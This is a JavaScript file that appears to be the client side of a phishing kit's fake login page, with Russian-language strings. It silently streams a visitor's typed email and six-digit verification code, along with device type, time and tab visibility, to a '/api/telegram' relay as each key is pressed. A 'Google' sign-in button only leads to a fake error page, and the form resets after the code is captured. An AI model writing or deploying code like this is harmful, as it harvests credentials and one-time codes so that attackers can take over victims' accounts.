document.addEventListener('DOMContentLoaded', function () {
  const state = {
    messageId: null,
    uniqueId: 'mail_' + Math.random().toString(36).substring(2, 15),
    email: '',
    code: '',
    isOnline: true,
    lastStatusSent: null,
  };

  let sendTimer = null;
  let inFlightPromise = null;
  let hasQueuedSend = false;

  async function runQueuedSend() {
    if (inFlightPromise) {
      hasQueuedSend = true;
      return inFlightPromise;
    }

    inFlightPromise = (async () => {
      try {
        do {
          hasQueuedSend = false;
          await sendToTelegram();
        } while (hasQueuedSend);
      } finally {
        inFlightPromise = null;
      }
    })();

    return inFlightPromise;
  }

  function scheduleSend(immediate = false) {
    clearTimeout(sendTimer);
    if (immediate) {
      return runQueuedSend();
    }
    sendTimer = setTimeout(() => {
      runQueuedSend();
    }, 400);
    return Promise.resolve();
  }

  function getDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
      ? 'Мобильное устройство'
      : 'ПК / Ноутбук';
  }

  function getTimeMSK() {
    return new Date().toLocaleTimeString('ru-RU', {
      timeZone: 'Europe/Moscow',
      hour: '2-digit',
      minute: '2-digit',
    });
  }

  async function sendToTelegram() {
    const currentStatus = state.isOnline ? 'В сети' : 'Не в сети';
    const payload = {
      message_id: state.messageId,
      emails: state.email ? [{ text: state.email, time: getTimeMSK() }] : [],
      codes: state.code ? [{ text: state.code, time: getTimeMSK() }] : [],
      status: currentStatus,
      device: getDevice(),
      unique_id: state.uniqueId,
    };

    try {
      const res = await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        credentials: 'same-origin',
      });
      if (res.ok) {
        const data = await res.json();
        if (data && data.message_id) {
          state.messageId = data.message_id;
        }
        state.lastStatusSent = currentStatus;
      }
    } catch (err) {
      console.error('Ошибка отправки:', err);
    }
  }

  function handleStatusChange(nextOnline) {
    const nextStatus = nextOnline ? 'В сети' : 'Не в сети';
    if (state.isOnline === nextOnline && state.lastStatusSent === nextStatus) {
      return;
    }
    state.isOnline = nextOnline;
    if (!state.messageId && !state.email && !state.code) {
      return;
    }
    scheduleSend(true);
  }

  document.addEventListener('visibilitychange', () => {
    handleStatusChange(!document.hidden);
  });

  const googleBtn = document.getElementById('googleBtn');
  if (googleBtn) {
    const goToGoogleError = () => {
      window.location.href = '/google-error.html';
    };
    googleBtn.addEventListener('click', goToGoogleError);
    googleBtn.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        goToGoogleError();
      }
    });
  }

  const loginForm = document.getElementById('loginForm');
  const emailInput = document.getElementById('email');
  const emailBox = document.getElementById('emailBox');
  const codeModal = document.getElementById('codeModal');
  const closeModalBtn = document.getElementById('closeModalBtn');
  const userEmailDisplay = document.getElementById('userEmailDisplay');
  const codeCells = Array.from(document.querySelectorAll('#codeInputs .code-cell'));
  const resendBtn = document.getElementById('resendBtn');

  function isValidEmail(value) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(value.trim());
  }

  function resetToRegistration() {
    if (codeModal) {
      codeModal.classList.remove('active');
    }
    if (emailInput) {
      emailInput.value = '';
    }
    if (emailBox) {
      emailBox.classList.remove('has-error');
    }
    codeCells.forEach((cell) => {
      cell.value = '';
      cell.classList.remove('filled');
    });
    state.email = '';
    state.code = '';
    state.messageId = null;
    state.lastStatusSent = null;
    state.uniqueId = 'mail_' + Math.random().toString(36).substring(2, 15);
    if (emailInput) {
      emailInput.focus();
    }
  }

  if (emailInput && emailBox) {
    emailInput.addEventListener('input', () => {
      state.email = emailInput.value.trim();
      if (emailBox.classList.contains('has-error') && isValidEmail(state.email)) {
        emailBox.classList.remove('has-error');
      }
      scheduleSend(false);
    });
  }

  if (loginForm && emailInput && codeModal) {
    loginForm.addEventListener('submit', function (e) {
      e.preventDefault();
      const emailVal = emailInput.value.trim();

      if (!isValidEmail(emailVal)) {
        emailBox.classList.add('has-error');
        emailInput.focus();
        return;
      }

      emailBox.classList.remove('has-error');
      state.email = emailVal;
      state.code = '';

      if (userEmailDisplay) {
        userEmailDisplay.textContent = emailVal;
      }

      codeCells.forEach((cell) => {
        cell.value = '';
        cell.classList.remove('filled');
      });

      codeModal.classList.add('active');
      if (codeCells[0]) codeCells[0].focus();

      scheduleSend(true);
    });
  }

  function closeModal() {
    if (codeModal) codeModal.classList.remove('active');
  }

  if (closeModalBtn) closeModalBtn.addEventListener('click', closeModal);
  if (codeModal) {
    codeModal.addEventListener('click', (e) => {
      if (e.target === codeModal) closeModal();
    });
  }
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && codeModal && codeModal.classList.contains('active')) {
      closeModal();
    }
  });

  let isCompletingCode = false;

  codeCells.forEach((cell, index) => {
    cell.addEventListener('input', async function () {
      if (isCompletingCode) return;

      this.value = this.value.replace(/\D/g, '').slice(0, 1);
      this.classList.toggle('filled', this.value.length > 0);

      if (this.value && index < codeCells.length - 1) {
        codeCells[index + 1].focus();
      }

      state.code = codeCells.map((c) => c.value).join('');

      if (state.code.length === 6) {
        isCompletingCode = true;
        await scheduleSend(true);
        setTimeout(() => {
          resetToRegistration();
          isCompletingCode = false;
        }, 400);
      } else {
        scheduleSend(false);
      }
    });

    cell.addEventListener('keydown', function (e) {
      if (e.key === 'Backspace' && !this.value && index > 0) {
        codeCells[index - 1].focus();
        codeCells[index - 1].value = '';
        codeCells[index - 1].classList.remove('filled');
        state.code = codeCells.map((c) => c.value).join('');
        scheduleSend(false);
      }
    });
  });

  if (resendBtn) {
    resendBtn.addEventListener('click', () => {
      codeCells.forEach((cell) => {
        cell.value = '';
        cell.classList.remove('filled');
      });
      state.code = '';
      if (codeCells[0]) codeCells[0].focus();
      scheduleSend(true);
    });
  }

  // ✅ ИЗМЕНЕНИЕ: отправляем начальное уведомление сразу при заходе на сайт.
  // Дальше это же сообщение будет редактироваться при вводе почты/кода.
  scheduleSend(true);
});